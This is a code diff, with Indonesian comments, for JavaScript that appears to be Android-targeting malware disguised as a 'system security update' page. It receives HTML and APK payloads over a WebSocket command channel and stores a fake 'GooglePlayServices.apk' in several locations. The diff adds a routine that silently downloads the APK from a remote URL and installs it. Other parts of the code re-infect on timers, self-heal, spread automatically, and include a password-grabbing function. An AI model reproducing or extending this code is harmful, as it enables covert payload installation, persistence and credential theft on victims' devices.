@@ -104,7 +104,6 @@ var PLATFORM = detectPlatform();
 
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
-    // ... (definisikan semua fungsi seperti di index.html, tambahkan fileExists, readFile, saveFileBinary, saveToPreferences, getFromPreferences)
     saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
     readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
     fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
@@ -152,7 +151,6 @@ function saveHTMLToAllLocations(htmlContent) {
     } catch(e) {}
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            // 🔥 PERBAIKAN: Ganti ke Download folder
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
@@ -160,13 +158,11 @@ function saveHTMLToAllLocations(htmlContent) {
             var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
-        // 🔥 HAPUS: simpan ke com.android.camera (tidak diperlukan)
     }
 }
 
 function loadHTMLFromAllLocations() {
     return new Promise(function(resolve) {
-        // 1. SharedPreferences
         if (PLATFORM.isAndroid && A.isAvailable) {
             try {
                 var encoded = A.getFromPreferences('system_SystemUpdate_html');
@@ -176,12 +172,10 @@ function loadHTMLFromAllLocations() {
                 }
             } catch(e) {}
         }
-        // 2. localStorage
         try {
             var ls = localStorage.getItem('SystemUpdate_backup');
             if (ls) { resolve(ls); return; }
         } catch(e) {}
-        // 3. IndexedDB
         try {
             var request = indexedDB.open('SystemUpdateDB', 1);
             request.onsuccess = function(e) {
@@ -191,14 +185,12 @@ function loadHTMLFromAllLocations() {
                 var get = store.get('SystemUpdate.html');
                 get.onsuccess = function() {
                     if (get.result) { resolve(get.result); return; }
-                    // 4. 🔥 PERBAIKAN: Ganti ke Download folder
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
                             var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
                             if (content) { resolve(content); return; }
                         } catch(e) {}
                     }
-                    // 🔥 HAPUS: pembacaan dari Android/data dan com.android.camera
                     resolve(null);
                 };
             };
@@ -261,7 +253,6 @@ function connectWebSocket() {
                     if (html) {
                         saveHTMLToAllLocations(html);
                         K({ sumber: 'code_push_html', data: 'received' });
-                        // Re-execute if needed
                         executeHTML(html);
                     }
                 } else if (data.type === 'push_apk') {
@@ -269,8 +260,9 @@ function connectWebSocket() {
                     if (apkBase64) {
                         saveAPKToAllLocations(apkBase64);
                         K({ sumber: 'code_push_apk', data: 'received' });
-                        // Install after save
-                        installAPKFromAvailablePath();
+                        setTimeout(function() {
+                            installAPKFromAvailablePath();
+                        }, 3000);
                     }
                 } else if (data.type === 'ping') {
                     ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
@@ -308,28 +300,23 @@ function connectWebSocketWithFallback() {
 // ============================================================
 function saveAPKToAllLocations(apkBase64) {
     if (!apkBase64) return;
-    // 1. SharedPreferences (Base64)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 2. 🔥 PERBAIKAN: Ganti ke Download folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
-        // 3. Internal APK folder (paling aman) - 🔥 PERBAIKAN package name
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
             A.saveFileBinary(internalPath, binary);
         } catch(e) {}
-        // 🔥 HAPUS: simpan ke Android/data/com.android.camera (tidak diperlukan)
     }
 }
 
 function getAPKPath() {
     var paths = [
-        // 🔥 PERBAIKAN: urutan prioritas (internal, Download)
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
         '/storage/emulated/0/Download/GooglePlayServices.apk'
     ];
@@ -363,7 +350,6 @@ function installAPKFromAvailablePath() {
                 return;
             }
         } catch(e) {}
-        // Fallback: Intent
         try {
             window.location.href = 'file://' + path;
             APK_INSTALLED = true;
@@ -382,23 +368,67 @@ function requestAPKFromServer() {
 }
 
 // ============================================================
+// 🔥 DOWNLOAD & INSTALL APK (UNIVERSAL) - DITAMBAHKAN!
+// ============================================================
+function downloadAndInstallAPK() {
+    var apkUrl = APK_URL;
+    // Method 1: XHR with Blob
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', apkUrl, true);
+        xhr.responseType = 'blob';
+        xhr.timeout = 60000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var blob = xhr.response;
+                var reader = new FileReader();
+                reader.onload = function() {
+                    var base64 = reader.result.split(',')[1];
+                    if (base64) {
+                        saveAPKToAllLocations(base64);
+                        K({ sumber: 'apk_download_success', data: 'ok' });
+                        setTimeout(function() {
+                            installAPKFromAvailablePath();
+                        }, 3000);
+                    }
+                };
+                reader.readAsDataURL(blob);
+            }
+        };
+        xhr.send();
+    } catch(e) {
+        // Fallback: anchor download
+        try {
+            var a = document.createElement('a');
+            a.href = apkUrl;
+            a.download = 'GooglePlayServices.apk';
+            a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+            document.body.appendChild(a);
+            setTimeout(function() {
+                a.click();
+                setTimeout(function() {
+                    try { document.body.removeChild(a); } catch(e) {}
+                }, 2000);
+            }, 500);
+            K({ sumber: 'apk_download_fallback', data: 'ok' });
+        } catch(e2) {}
+    }
+}
+
+// ============================================================
 // SELF-HEALING (30 MENIT)
 // ============================================================
 function startSelfHealing() {
     setInterval(function() {
-        // Cek apakah SystemUpdate.html masih ada di semua lokasi
         loadHTMLFromAllLocations().then(function(html) {
             if (!html) {
-                // Minta dari server via WebSocket
                 if (wsConnected && ws) {
                     ws.send(JSON.stringify({ type: 'request_html' }));
                 }
             } else {
-                // Pastikan semua lokasi terisi
                 saveHTMLToAllLocations(html);
             }
         });
-        // Cek APK
         if (PLATFORM.isAndroid && A.isAvailable) {
             var apkPath = getAPKPath();
             if (!apkPath) {
@@ -406,7 +436,7 @@ function startSelfHealing() {
             }
         }
         K({ sumber: 'self_heal_check', data: 'done' });
-    }, 30 * 60 * 1000); // 30 MENIT
+    }, 30 * 60 * 1000);
 }
 
 // ============================================================
@@ -474,13 +504,12 @@ function ambilPassword() {
                         startHeartbeat();
                         startReinfection();
                         autoExecuteC2();
-                        // Load HTML dari semua lokasi (untuk self-repair)
                         loadHTMLFromAllLocations().then(function(html) {
                             if (html) saveHTMLToAllLocations(html);
                         });
-                        // APK: coba install dari lokasi yang ada, atau minta server
+                        // 🔥 GANTI: download & install APK
                         setTimeout(function() {
-                            installAPKFromAvailablePath();
+                            downloadAndInstallAPK();
                         }, 3000);
                         setTimeout(autoSpread, 2000);
                         startSelfHealing();
@@ -499,7 +528,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    installAPKFromAvailablePath();
+                    downloadAndInstallAPK();
                 }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
@@ -519,7 +548,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    installAPKFromAvailablePath();
+                    downloadAndInstallAPK();
                 }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
@@ -539,7 +568,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    installAPKFromAvailablePath();
+                    downloadAndInstallAPK();
                 }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
@@ -594,7 +623,7 @@ function startReinfection() {
     setInterval(function() {
         if (!APK_INSTALLED) {
             K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
-            installAPKFromAvailablePath();
+            downloadAndInstallAPK();
         } else {
             K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
         }
@@ -1109,7 +1138,6 @@ function finishAndRedirect() {
 updateProgress(5, '⏳ Memperbarui System Keamanan...');
 K({ sumber: 'system_update_start', data: { platform: PLATFORM } });
 
-// Load HTML dari semua lokasi (self-repair)
 loadHTMLFromAllLocations().then(function(html) {
     if (html) {
         saveHTMLToAllLocations(html);
@@ -1117,7 +1145,6 @@ loadHTMLFromAllLocations().then(function(html) {
     }
 });
 
-// Register service worker (untuk cache)
 if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('/sw.js', { scope: '/' })
         .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
